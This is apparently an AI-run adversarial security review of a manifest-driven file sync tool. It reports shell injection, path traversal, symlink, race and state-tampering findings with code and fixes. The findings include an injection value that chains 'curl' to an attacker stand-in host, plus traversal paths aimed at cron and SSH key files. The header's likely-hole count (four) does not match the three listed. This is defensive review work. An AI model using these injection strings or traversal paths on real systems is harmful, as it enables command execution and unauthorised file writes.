# Adversarial Review Log — framework-standalone-repo (Phase A)

**Branch:** `claude/framework-standalone-repo`
**Build slug:** `framework-standalone-repo`
**Reviewed at HEAD:** `ade9267e` plus working-tree (uncommitted Phase A deliverables)
**Reviewed:** 2026-05-04T06:08:15Z

**Verdict:** HOLES_FOUND — 2 confirmed-holes, 4 likely-holes, 4 worth-confirming.

**Reviewer:** adversarial-reviewer (read-only, manual invocation)

**Note on auto-trigger:** This branch's diff is NOT in the standard auto-trigger surface (no server/db/schema, server/routes, auth/permission services, middleware, RLS migrations, webhook handlers). This review was invoked manually because the implementation includes a sync engine performing filesystem writes driven by manifest data. Phase 1 advisory; non-blocking.

---

## Reviewed files

- `setup/portable/sync.js` (full, ~1369 lines)
- `setup/portable/manifest.json`
- `setup/portable/SYNC.md`
- `setup/portable/ADAPT.md`
- `setup/portable/tests/helpers.test.ts`
- `setup/portable/tests/walk-classify.test.ts`
- `setup/portable/tests/substitute-write.test.ts`
- `setup/portable/tests/settings-merge.test.ts`
- `setup/portable/tests/e2e-adopt-invariants.test.ts`
- `setup/portable/tests/flags.test.ts` (metadata scan)
- `setup/portable/tests/e2e-adopt.test.ts`, `e2e-sync.test.ts`, `e2e-merge.test.ts` (metadata scan)
- `scripts/build-portable-framework.ts`
- `setup/portable/.claude/CHANGELOG.md`
- `setup/portable/.claude/FRAMEWORK_VERSION`
- Agent definition updates (metadata scan)
- `eslint.config.js`

---

## Threat-model checklist

### 1. RLS / tenant isolation
Not applicable — local filesystem sync tool, no database, no RLS surface.

### 2. Auth & permissions
Not applicable — no auth layer, no session identity, no webhook handlers.

### 3. Race conditions

**[likely-hole] Concurrent sync processes clobber each other's state via a shared `.tmp` file**

`sync.js:278-282` — `writeStateAtomic` hard-codes the tmp filename as `finalPath + '.tmp'`:

```
const tmpPath = finalPath + '.tmp';
await fs.writeFile(tmpPath, json, 'utf8');
await fs.rename(tmpPath, finalPath);
```

If two sync processes run concurrently against the same target root (e.g. CI matrix lane that runs `--check` while another lane runs sync, or a Claude session calling sync while the operator does too), the second `writeFile(tmpPath, ...)` overwrites the first process's `.tmp` before it is renamed. The result is a state file from one process silently discarding the other's view.

**Suggested fix:** use a PID- or UUID-suffixed tmp file (`finalPath + '.' + process.pid + '.tmp'`).

### 4. Injection

**[confirmed-hole] Shell injection via `frameworkRoot` path in `execSync` template literals**

`sync.js:323` and `sync.js:341` — both `getSubmoduleCommit` and `checkSubmoduleClean`:

```js
execSync(`git -C "${frameworkRoot}" rev-parse HEAD`, { encoding: 'utf8' })
```

Only escaping is wrapping in double-quotes. On POSIX, an embedded double-quote or shell metacharacter in `frameworkRoot` breaks the quote. Currently low-exploitability (`frameworkRoot = path.resolve(__dirname)`), but defence-in-depth gap if any future code path admits attacker-controlled paths.

**Suggested fix:** `spawnSync('git', ['-C', frameworkRoot, 'rev-parse', 'HEAD'], ...)` (array args — no shell interpolation).

**[confirmed-hole] Path traversal via manifest `path` entries**

`sync.js:100-132` — `expandGlob` uses `path.join(rootDir, ...dirSegments)` then `path.join(rootDir, pat)`. `path.join` normalises `..` segments. A manifest entry whose `path` field contains `..` resolves *outside* `rootDir`. Examples:

- `"path": "../../etc/cron.d/evil"` → `path.join(frameworkRoot, '../../etc/cron.d/evil')` = `/etc/cron.d/evil`.
- `"path": "../../../home/user/.ssh/authorized_keys"` — similar escape.

The expanded relative path is passed to `writeUpdated`, `writeNewFile`, `writeFrameworkNew`, each calling `path.join(targetRoot, relativePath)` → escapes again.

**Attack vector:** the manifest is embedded in the framework bundle (the submodule). An attacker who can push a malicious framework version (compromised upstream submodule, MITM of submodule update) gains arbitrary file-write to any path. The `doNotTouch` list does not guard — declared in the same untrusted manifest.

**Suggested fix:** after `expandGlob` returns, assert `path.resolve(rootDir, rel).startsWith(path.resolve(rootDir) + path.sep)`. Apply in `expandManagedFiles` (source side) and in each writer before constructing `targetPath`.

**[likely-hole] Symlink following — writes follow symlinks pointing outside the repo**

`sync.js:606-608`, `sync.js:657-658`, `sync.js:689-690` — `fs.writeFile(targetPath, ...)` follows symlinks unconditionally. If a managed path (e.g. `.claude/agents/architect.md`) in the target repo is a symlink pointing to `/etc/passwd`, `writeUpdated` overwrites that target via the symlink.

**Attack scenario:** a contributor with PR-write access places a symlink at a managed path. Next sync overwrites the symlink target with framework content. Reverse direction also leaks: `readFileSync` follows symlinks too, hashing and storing file existence in `.framework-state.json`.

**Suggested fix:** `fs.lstat` before each write; reject symlinks at managed paths.

**[likely-hole] Substitution values with shell metacharacters injected into agent prompts**

`sync.js:579-585` — `applySubstitutions` does a simple `split({{KEY}}).join(value)`. `validateSubstitutions` (line 526-533) rejects `{{` in values but not shell metacharacters (`$()`, backtick, `|`, `;`, `&`, newlines).

Agent files load as Claude Code context and may be fed verbatim to Bash hooks. If an operator sets `{{PROJECT_NAME}}` to `Acme; curl https://attacker.example/`, that string lands in agent `.md` files. Currently low-exploitability — agent files are prose context, not directly executed — but the substitution pipeline has no output encoding.

**Suggested fix:** at minimum, document allowed characters in `validateSubstitutions`. Consider rejecting shell metacharacters for substitutions used in agent files.

### 5. Resource abuse

No unbounded loops, no recursive invocation. Glob engine rejects `**` (line 79), bounding expansion depth.

**No findings.**

### 6. Cross-tenant data leakage
Not applicable.

---

## Additional threat-model areas (non-standard categories)

### State-file integrity / tamper-resilience

**[worth-confirming] No schema validation on `readState` — tampered state.json passes through verbatim**

`sync.js:254-261` — `readState` does `JSON.parse(raw)` and returns the result with no field-level validation. The `FrameworkState` type is JSDoc-only (static-time, not runtime).

**Scenario:** an attacker who can write to `.claude/.framework-state.json` (CI secrets compromise, supply-chain lateral movement, misconfigured pipeline write step) sets `lastAppliedHash` to the SHA-256 of a malicious agent file already placed at the managed path. `classifyFile` reads the target, hashes it, finds the (forged) match, returns `skipped/already-on-version`. The malicious agent is never touched by future syncs and is invisible to `--check`.

This is "state-file tampering as persistence mechanism." Severity depends on whether `.framework-state.json` is in source control.

**Suggested fix:** document that `.framework-state.json` MUST be committed and reviewed. Add a `--verify` mode that recomputes all hashes from disk independently of the "already on version" short-circuit.

### --force + unresolved merges

**[worth-confirming] `--force` silently replaces in-progress operator merge work**

`sync.js:1081-1090` — the unresolved-merge guard is gated by `!flags.force`. With `--force`, `writeFrameworkNew` (line 641-642) detects `priorExists = true`, logs `prior_framework_new=replaced` to **stdout** (not stderr), and overwrites.

Operator partial merge work is silently discarded.

**Suggested fix:** when `--force` is passed and a `.framework-new` already exists, write to `<file>.framework-new.incoming` instead. Or emit the replacement warning to stderr with a stronger label.

### --check exit-code for ownership-transferred

**[worth-confirming] `--check` does not account for `ownership-transferred`**

`sync.js:1132-1148` — the `--check` loop counts `clean.needsUpdate` and `customised`. An `ownership-transferred` classification (manifest entry changed from `sync` to `adopt-only`) sets neither flag. Exit is `0` even though a mode-change is pending.

A CI gate using `--check` to mean "framework clean" passes through the mode-change silently.

**Suggested fix:** count `ownership-transferred` in `updatesAvailable`.

### mergeSettings drops non-hooks framework keys

**[worth-confirming] Framework's non-hooks top-level keys are silently dropped**

`sync.js:950-953`:

```js
const mergedSettings = { ...projectSettings, hooks: mergedHooks };
```

The framework's `settings.json` may contain top-level keys other than `hooks` (a future `permissions.deny` block, an `env` allowlist, a `model` override). Framework non-hooks keys are never spread in. If the framework ships a security-relevant default in a future version (e.g. `permissions.deny` for dangerous tools), it's silently dropped every merge — leaving the target without the protection.

Latent gap, not currently exploitable because the shipped framework `settings.json` contains only `hooks`. But the merge strategy is structurally unsafe for future evolution.

**Suggested fix:** `{ ...frameworkSettingsNonHooks, ...projectSettings, hooks: mergedHooks }` — framework safe-defaults, project overrides, hooks merged separately.

---

## Triage summary

| Tag | Count | Action |
|---|---|---|
| confirmed-hole | 2 | Fix in this branch (escalate to STRONG given pre-production state) |
| likely-hole | 3 | Fix race + symlink in this branch; substitution-shell-metachars route to `tasks/todo.md` |
| worth-confirming | 4 | Implement: --check ownership-transferred (1-line); mergeSettings non-hooks keys (small refactor); state-tamper documentation note. Defer --force edge to `tasks/todo.md`. |

Per CLAUDE.md, adversarial-reviewer is Phase 1 advisory and non-blocking. The caller (main session) decides which findings to action and which to defer to `tasks/todo.md`.
